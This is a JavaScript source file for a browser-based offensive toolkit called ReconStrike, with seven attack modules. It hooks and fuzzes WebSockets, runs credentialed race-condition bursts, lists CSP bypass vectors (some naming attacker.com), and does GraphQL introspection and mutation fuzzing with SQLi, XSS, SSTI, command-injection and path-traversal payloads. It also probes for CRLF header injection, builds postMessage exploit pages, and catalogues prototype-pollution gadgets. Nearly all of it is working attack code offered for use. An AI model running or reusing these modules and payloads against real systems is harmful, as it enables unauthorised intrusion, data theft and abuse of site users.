// language: JavaScript, file: 2_offensive.js, target: modern browsers
// ReconStrike V17 -- Layer 2 Offensive (orchestrator-integrated)

(function () {
  'use strict';
  if (!window.ReconCore) return;
  var core = window.ReconCore;
  var eventBus = core.eventBus;
  var storage = core.storage;
  var scope = core.scope;
  var mods = core.modules = core.modules || {};

  // ══════════════════════════════════════════════════════════════
  // MODULE 1 -- WebSocket Fuzzer (subscribes to RS_ORCH)
  // ══════════════════════════════════════════════════════════════
  mods.wsFuzzer = (function () {
    var sockets = new Map(); // id → record
    var byUrl = new Map();   // url → id (for lookups)
    var HOOK_ID = 'rs13-wsFuzzer';

    function persistSocket(id, rec) {
      try {
        storage.put('meta', {
          kind: 'ws-socket',
          socketId: id,
          url: rec.url,
          opened: rec.opened,
          closed: rec.closed || null,
          sent: rec.sent,
          received: rec.received,
          messages: rec.messages.slice(-50)
        }, 'ws-sock::' + id);
      } catch (e) {}
    }

    function ensureRecord(ctx) {
      var id = ctx.__wsId;
      if (!id) {
        id = Math.random().toString(36).slice(2);
        ctx.__wsId = id;
      }
      var rec = sockets.get(id);
      if (!rec) {
        rec = {
          id: id,
          url: ctx.url || '',
          ws: ctx.ws || null,
          opened: Date.now(),
          closed: null,
          sent: 0,
          received: 0,
          messages: []
        };
        sockets.set(id, rec);
        if (rec.url) byUrl.set(rec.url, id);
      }
      return rec;
    }

    function register() {
      var orch = window.RS_ORCH;
      if (!orch || typeof orch.registerHook !== 'function') return false;

      orch.registerHook('ws', HOOK_ID, {
        open: function (ctx) {
          try {
            var rec = ensureRecord(ctx);
            rec.ws = ctx.ws;
            persistSocket(rec.id, rec);
            eventBus.emit('ws:open', { id: rec.id, url: rec.url });
          } catch (e) {}
        },
        close: function (ctx) {
          try {
            var id = ctx.__wsId;
            if (!id) return;
            var rec = sockets.get(id);
            if (!rec) return;
            rec.closed = Date.now();
            persistSocket(id, rec);
            eventBus.emit('ws:close', { id: id, url: rec.url });
            sockets.delete(id);
            byUrl.delete(rec.url);
          } catch (e) {}
        },
        message: function (ctx) {
          try {
            var id = ctx.__wsId;
            if (!id) return;
            var rec = sockets.get(id);
            if (!rec) return;
            rec.received++;
            var data = typeof ctx.message === 'string' ? ctx.message.slice(0, 4096) : '[binary]';
            rec.messages.push({ dir: 'in', t: Date.now(), data: data });
            if (rec.messages.length > 200) rec.messages.shift();
            if ((rec.sent + rec.received) % 5 === 0) persistSocket(id, rec);
            eventBus.emit('ws:message', { id: id, dir: 'in', data: data });
          } catch (e) {}
        },
        send: function (ctx) {
          try {
            var id = ctx.__wsId;
            if (!id) return;
            var rec = sockets.get(id);
            if (!rec) return;
            rec.sent++;
            var data = typeof ctx.sent === 'string' ? ctx.sent.slice(0, 4096) : '[binary]';
            rec.messages.push({ dir: 'out', t: Date.now(), data: data });
            if (rec.messages.length > 200) rec.messages.shift();
            if ((rec.sent + rec.received) % 5 === 0) persistSocket(id, rec);
            eventBus.emit('ws:message', { id: id, dir: 'out', data: data });
          } catch (e) {}
        }
      });
      return true;
    }

    var PAYLOADS = [
      '{"action":"ping"}',
      '{"__proto__":{"polluted":true}}',
      '{"constructor":{"prototype":{"polluted":true}}}',
      '{"type":"subscribe","channel":"../admin"}',
      '{"id":null}',
      '{"id":"00000000-0000-0000-0000-000000000000"}',
      '{"id":1e309}',
      '\u0000\u0001\u0002',
      '{"$where":"1==1"}',
      '{"query":"{__typename}"}'
    ];

    async function fuzz(socketId, rounds) {
      rounds = rounds || 1;
      var rec = sockets.get(socketId);
      if (!rec || !rec.ws || rec.ws.readyState !== 1) {
        return { ok: false, reason: 'socket not open' };
      }
      var results = [];
      for (var r = 0; r < rounds; r++) {
        for (var i = 0; i < PAYLOADS.length; i++) {
          try {
            rec.ws.send(PAYLOADS[i]);
            results.push({ payload: PAYLOADS[i].slice(0, 80), sent: true, t: Date.now() });
            await new Promise(function (res) { setTimeout(res, 60 + Math.random() * 120); });
          } catch (e) {
            results.push({ payload: PAYLOADS[i].slice(0, 80), sent: false, err: e.message });
          }
        }
      }
      try {
        storage.put('meta', {
          kind: 'ws-fuzz',
          socketId: socketId,
          url: rec.url,
          count: results.length,
          results: results
        }, 'ws-fuzz::' + socketId + '::' + Date.now());
      } catch (e) {}
      return { ok: true, count: results.length, results: results };
    }

    function list() { return Array.from(sockets.values()); }
    function get(id) { return sockets.get(id); }
    function getByUrl(url) {
      var id = byUrl.get(url);
      return id ? sockets.get(id) : null;
    }

    var registered = register();
    if (!registered) {
      setTimeout(function () {
        registered = register();
        if (!registered) {
          try { console.warn('[rs13-wsFuzzer] RS_ORCH unavailable -- WS hook disabled'); } catch (e) {}
        }
      }, 300);
    }

    return {
      fuzz: fuzz,
      list: list,
      get: get,
      getByUrl: getByUrl,
      sockets: sockets,
      hooks: function () { return registered; }
    };
  })();

  // ══════════════════════════════════════════════════════════════
  // MODULE 2 -- Race Condition Tester (uses RS_ORCH.rfetch)
  // ══════════════════════════════════════════════════════════════
  mods.race = (function () {
    async function sendConcurrent(opts) {
      opts = opts || {};
      var url = opts.url;
      var method = opts.method || 'POST';
      var headers = opts.headers || {};
      var body = opts.body || '';
      var n = opts.n || 20;
      var credentials = opts.credentials || 'include';

      if (!url) return { ok: false, reason: 'no url' };

      var rfetch = (window.RS_ORCH && typeof window.RS_ORCH.rfetch === 'function')
        ? window.RS_ORCH.rfetch.bind(window.RS_ORCH)
        : fetch;

      var promises = [];
      for (var i = 0; i < n; i++) {
        promises.push(
          (function () {
            return rfetch(url, {
              method: method,
              headers: headers,
              body: body,
              credentials: credentials
            }).then(function (r) {
              return r.text().then(function (t) {
                return { status: r.status, len: t.length, snippet: t.slice(0, 300) };
              });
            }).catch(function (e) {
              return { err: e.message };
            });
          })()
        );
      }

      var results = await Promise.all(promises);
      var byStatus = {};
      var successes = 0;
      var snippets = new Set();
      results.forEach(function (r) {
        var k = r.status || 'ERR';
        byStatus[k] = (byStatus[k] || 0) + 1;
        if (r.status && r.status >= 200 && r.status < 300) successes++;
        if (r.snippet) snippets.add(r.snippet);
      });

      var verdict =
        successes > 1 && n > 1 ? 'RACE-DETECTED: multiple 2xx responses for one-shot op' :
        snippets.size > 1 ? 'INCONSISTENT: responses differ -- possible TOCTOU' :
        'no signal';

      try {
        storage.put('meta', {
          kind: 'race',
          url: url,
          method: method,
          n: n,
          verdict: verdict,
          successes: successes,
          byStatus: byStatus,
          snippetCount: snippets.size,
          sample: results.slice(0, 5)
        }, 'race::' + storage.hashKey(method + '::' + url + '::' + n + '::' + Date.now()));
      } catch (e) {}

      return {
        verdict: verdict,
        byStatus: byStatus,
        successes: successes,
        total: n,
        inconsistent: snippets.size > 1,
        results: results
      };
    }
    return { sendConcurrent: sendConcurrent };
  })();

  // ══════════════════════════════════════════════════════════════
  // MODULE 3 -- CSP Analyzer (pure parser)
  // ══════════════════════════════════════════════════════════════
  mods.csp = (function () {
    function parseCSP(str) {
      var out = {};
      String(str || '').split(';').forEach(function (d) {
        var parts = d.trim().split(/\s+/);
        var k = parts.shift();
        if (k) out[k.toLowerCase()] = parts;
      });
      return out;
    }

    function analyze(meta) {
      var csp = parseCSP(meta);
      var findings = [];
      if (!meta) {
        findings.push({ sev: 'MEDIUM', issue: 'No CSP policy provided' });
        return { csp: csp, findings: findings };
      }

      var scriptSrc = (csp['script-src'] || csp['default-src'] || []).join(' ');
      var objSrc = (csp['object-src'] || csp['default-src'] || []).join(' ');

      if (scriptSrc.indexOf("'unsafe-inline'") !== -1) findings.push({ sev: 'CRITICAL', issue: "'unsafe-inline' allows inline scripts", vector: '<script>alert(1)</script>' });
      if (scriptSrc.indexOf("'unsafe-eval'") !== -1) findings.push({ sev: 'CRITICAL', issue: "'unsafe-eval' allows eval/Function", vector: 'eval("alert(1)")' });
      if (scriptSrc.indexOf('*') !== -1 || scriptSrc.indexOf('http:') !== -1) findings.push({ sev: 'HIGH', issue: 'Wildcard or insecure script source', vector: 'script-src https://attacker.com/x.js' });
      if (scriptSrc.indexOf('data:') !== -1) findings.push({ sev: 'HIGH', issue: 'data: allowed in script-src', vector: '<script src="data:text/javascript,alert(1)">' });
      if (scriptSrc.indexOf('cdn.jsdelivr.net') !== -1 || scriptSrc.indexOf('unpkg.com') !== -1) findings.push({ sev: 'MEDIUM', issue: 'JSONP-capable CDN allowlisted', vector: 'jsonp hijack' });
      if (objSrc.indexOf("'none'") === -1) findings.push({ sev: 'HIGH', issue: "object-src not 'none'", vector: '<object data="data:text/html,<script>alert(1)</script>">' });
      if (String(meta).indexOf('base-uri') === -1) findings.push({ sev: 'MEDIUM', issue: 'base-uri not restricted', vector: '<base href="//attacker.com/">' });
      if (String(meta).indexOf('frame-ancestors') === -1) findings.push({ sev: 'MEDIUM', issue: 'No frame-ancestors -- clickjacking possible' });
      if (String(meta).indexOf('form-action') === -1) findings.push({ sev: 'LOW', issue: 'form-action unrestricted' });

      var nonceMatch = scriptSrc.match(/'nonce-([^']+)'/);
      if (nonceMatch && nonceMatch[1].length < 16) findings.push({ sev: 'HIGH', issue: 'Nonce too short (' + nonceMatch[1].length + ' chars)' });

      return { csp: csp, findings: findings };
    }

    return { analyze: analyze, parseCSP: parseCSP };
  })();

  // ══════════════════════════════════════════════════════════════
  // MODULE 4 -- GraphQL
  // ══════════════════════════════════════════════════════════════
  mods.graphql = (function () {
    async function introspect(endpoint, headers) {
      headers = headers || {};
      var q = JSON.stringify({ query: 'query IntrospectSchema { __schema { queryType{name} mutationType{name} types{ name kind fields{name} } } }' });
      try {
        var r = await fetch(endpoint, {
          method: 'POST',
          headers: Object.assign({ 'Content-Type': 'application/json' }, headers),
          body: q,
          credentials: 'omit'
        });
        if (!r.ok) return { ok: false, status: r.status };
        var d = await r.json();
        if (!d || !d.data || !d.data.__schema) return { ok: false, reason: 'no schema' };
        var types = (d.data.__schema.types || []).filter(function (t) { return t.name.indexOf('__') !== 0; });
        var mutations = [];
        var mutationTypeName = d.data.__schema.mutationType && d.data.__schema.mutationType.name;
        (d.data.__schema.types || []).forEach(function (t) {
          if (t.name === mutationTypeName) mutations = t.fields || [];
        });

        try {
          storage.put('graphql', {
            kind: 'graphql',
            endpoint: endpoint,
            typeCount: types.length,
            types: types.slice(0, 30).map(function (t) { return t.name; }),
            mutations: mutations.map(function (m) { return m.name; }),
            fullSchema: JSON.stringify(d.data.__schema).slice(0, 20000)
          }, 'gql::' + storage.hashKey(endpoint));
        } catch (e) {}

        return { ok: true, schema: d.data.__schema, types: types, mutations: mutations };
      } catch (e) {
        return { ok: false, error: e.message };
      }
    }

    var INJECTION_VECTORS = [
      { name: 'SQLi', payload: "\"' OR 1=1--" },
      { name: 'NoSQLi', payload: { $ne: null } },
      { name: 'XSS', payload: '<img src=x onerror=alert(1)>' },
      { name: 'SSTI', payload: '{{7*7}}' },
      { name: 'Command', payload: '; cat /etc/passwd' },
      { name: 'Path', payload: '../../etc/passwd' },
      { name: 'ProtoPol', payload: { __proto__: { x: 1 } } },
      { name: 'Null', payload: null },
      { name: 'IntOver', payload: 2147483648 }
    ];

    async function fuzzMutation(endpoint, mutationName, args, baseHeaders, fields) {
      baseHeaders = baseHeaders || {};
      fields = fields || 'id';
      var results = [];
      for (var i = 0; i < INJECTION_VECTORS.length; i++) {
        var v = INJECTION_VECTORS[i];
        var argsStr = (args || []).map(function (a) {
          return a.name + ': ' + JSON.stringify(v.payload);
        }).join(', ');
        var body = JSON.stringify({ query: 'mutation F { ' + mutationName + '(' + argsStr + ') { ' + fields + ' } }' });
        try {
          var r = await fetch(endpoint, {
            method: 'POST',
            headers: Object.assign({ 'Content-Type': 'application/json' }, baseHeaders),
            body: body,
            credentials: 'omit'
          });
          var text = await r.text();
          results.push({ vector: v.name, status: r.status, len: text.length, snippet: text.slice(0, 300) });
          await new Promise(function (res) { setTimeout(res, 80); });
        } catch (e) {
          results.push({ vector: v.name, err: e.message });
        }
      }
      var flagged = results.filter(function (r) { return r.status && r.status >= 500; });

      try {
        storage.put('graphql', {
          kind: 'graphql-fuzz',
          endpoint: endpoint,
          mutation: mutationName,
          count: results.length,
          flagged: flagged.length,
          results: results.slice(0, 10)
        }, 'gql-fuzz::' + storage.hashKey(endpoint + '::' + mutationName));
      } catch (e) {}

      return { results: results, flagged: flagged };
    }

    return { introspect: introspect, fuzzMutation: fuzzMutation, INJECTION_VECTORS: INJECTION_VECTORS };
  })();

  // ══════════════════════════════════════════════════════════════
  // MODULE 5 -- CRLF Injection
  // ══════════════════════════════════════════════════════════════
  mods.crlf = (function () {
    var PAYLOADS = [
      '%0d%0aX-Injected: rs',
      '%0aX-Injected: rs',
      '%0d%0a%0d%0a<html>rs</html>',
      '\\r\\nX-Injected: rs',
      '%E5%98%8A%E5%98%8DX-Injected: rs'
    ];

    async function probe(baseUrl, params) {
      var out = [];
      for (var i = 0; i < params.length; i++) {
        for (var j = 0; j < PAYLOADS.length; j++) {
          var u;
          try {
            u = new URL(baseUrl, location.href);
            u.searchParams.set(params[i], PAYLOADS[j]);
          } catch (e) { continue; }
          try {
            var r = await fetch(u.href, { credentials: 'omit', redirect: 'manual' });
            var hdr = r.headers.get('x-injected');
            var ct = r.headers.get('content-type') || '';
            var reflected = !!hdr || (ct.indexOf('text/html') !== -1 && PAYLOADS[j].indexOf('<html>') !== -1);
            out.push({ param: params[i], payload: PAYLOADS[j], status: r.status, injected: hdr, reflected: reflected });
            await new Promise(function (res) { setTimeout(res, 80); });
          } catch (e) {
            out.push({ param: params[i], payload: PAYLOADS[j], err: e.message });
          }
        }
      }

      var hits = out.filter(function (o) { return o.reflected; });
      try {
        storage.put('meta', {
          kind: 'crlf',
          url: baseUrl,
          total: out.length,
          reflected: hits.length,
          hits: hits.slice(0, 5),
          sample: out.slice(0, 5)
        }, 'crlf::' + storage.hashKey(baseUrl + '::' + Date.now()));
      } catch (e) {}

      return out;
    }
    return { probe: probe, PAYLOADS: PAYLOADS };
  })();

  // ══════════════════════════════════════════════════════════════
  // MODULE 6 -- postMessage Exploit Builder
  // ══════════════════════════════════════════════════════════════
  mods.pmExploit = (function () {
    function buildExploit(targetOrigin, messageShape) {
      var payload = JSON.stringify(messageShape || {
        type: 'getUser',
        url: 'javascript:alert(document.domain)',
        callback: 'alert'
      });
      var html = '<!DOCTYPE html>\n<html><head><title>postMessage PoC</title></head>\n'
        + '<body>\n<h3>postMessage exploit → ' + targetOrigin + '</h3>\n'
        + '<iframe id="t" src="' + targetOrigin + '" style="width:100%;height:300px"></iframe>\n'
        + '<textarea id="out" style="width:100%;height:200px"></textarea>\n'
        + '<script>\n'
        + 'var f = document.getElementById("t");\n'
        + 'f.onload = function () {\n'
        + '  try { f.contentWindow.postMessage(' + payload + ', "' + targetOrigin + '"); } catch (e) {}\n'
        + '};\n'
        + 'window.addEventListener("message", function (ev) {\n'
        + '  document.getElementById("out").value += "[from " + ev.origin + "] " + JSON.stringify(ev.data) + "\\n";\n'
        + '});\n'
        + '<\/script>\n</body></html>';

      try {
        storage.put('meta', {
          kind: 'pm-exploit',
          targetOrigin: targetOrigin,
          payload: payload,
          html: html.slice(0, 5000)
        }, 'pm::' + storage.hashKey(targetOrigin));
      } catch (e) {}

      return html;
    }
    return { buildExploit: buildExploit };
  })();

  // ══════════════════════════════════════════════════════════════
  // MODULE 7 -- Prototype Pollution Gadget Mapper
  // ══════════════════════════════════════════════════════════════
  mods.protoChain = (function () {
    var GADGETS = [
      { lib: 'jQuery <3.4', sink: '$("<img>") + html()', gadget: '{"__proto__":{"sourceURL":"\\n<script>alert(1)</script>"}}' },
      { lib: 'Lodash <4.17.17', sink: '_.template', gadget: '{"__proto__":{"sourceURL":"..."}}' },
      { lib: 'Vue 2', sink: 'v-html', gadget: '{"__proto__":{"template":"<img src=x onerror=alert(1)>"}}' },
      { lib: 'AngularJS', sink: 'expression eval', gadget: '{"__proto__":{"ngExpression":"alert(1)"}}' },
      { lib: 'React 15', sink: 'createElement', gadget: '{"__proto__":{"dangerouslySetInnerHTML":{"__html":"<img onerror=alert(1) src=x>"}}}' }
    ];

    function map() {
      try {
        storage.put('meta', {
          kind: 'proto-gadgets',
          detected: GADGETS.map(function (g) { return g.lib; }),
          gadgets: GADGETS.slice(0, 10)
        }, 'proto-gadgets::' + Date.now());
      } catch (e) {}
      return GADGETS;
    }

    return { map: map, GADGETS: GADGETS };
  })();

  // ══════════════════════════════════════════════════════════════
  // META + SIGNAL
  // ══════════════════════════════════════════════════════════════
  var META = {
    wsFuzzer:   { name: 'WebSocket Fuzzer',            sev: 'HIGH',     needs: 'WS active on target', orchestrated: true },
    race:       { name: 'Race Condition Tester',       sev: 'HIGH',     needs: 'state-changing endpoint', orchestrated: true },
    csp:        { name: 'CSP Bypass Analyzer',         sev: 'MEDIUM',   needs: 'CSP meta tag' },
    graphql:    { name: 'GraphQL Mutation Fuzzer',     sev: 'CRITICAL', needs: 'GraphQL endpoint' },
    crlf:       { name: 'CRLF/Header Injection',       sev: 'HIGH',     needs: 'reflected params' },
    pmExploit:  { name: 'postMessage Exploit Builder', sev: 'MEDIUM',   needs: 'postMessage listener' },
    protoChain: { name: 'Prototype Pollution Gadgets', sev: 'CRITICAL', needs: 'confirmed PP' }
  };

  core.modulesMeta = META;
  eventBus.emit('modules:ready', { count: Object.keys(META).length, names: Object.keys(META) });

  // Register cleanup via orchestrator
  try {
    var orch = window.RS_ORCH;
    if (orch && typeof orch.onCleanup === 'function') {
      orch.onCleanup(function () {
        try {
          if (orch.unregisterHook) {
            orch.unregisterHook('ws', 'rs13-wsFuzzer');
          }
        } catch (e) {}
      });
    }
  } catch (e) {}

  if (typeof completion === 'function') completion(true);
})();